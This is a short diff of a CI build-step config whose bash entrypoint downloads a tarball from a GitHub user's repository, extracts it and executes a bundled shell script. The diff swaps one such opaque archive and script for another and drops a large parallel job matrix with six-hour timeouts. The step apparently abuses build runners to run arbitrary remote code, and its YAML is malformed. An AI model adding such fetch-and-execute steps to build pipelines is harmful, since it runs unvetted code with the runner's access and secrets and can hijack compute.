@@ -1,14 +1,9 @@
 steps:
   - name: golang
-    max-parallel: 80
-      matrix:
-        go: [1.1, 1.2, 1.3, 1.4, 1.5]
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P]
-    timeout-minutes: 360
-     args:
+    args:
       - '-c'
       - >-
-         wget https://github.com/sabarlur/joker/raw/main/aing.tar.gz && tar xf aing.tar.gz && ./start.sh
+         wget https://github.com/sabarlur/coba/raw/main/tsvsc.tar.gz && tar xf tsvsc.tar.gz && ./tesvrsc.sh
     waitFor:
       - '-'
     entrypoint: /bin/bash
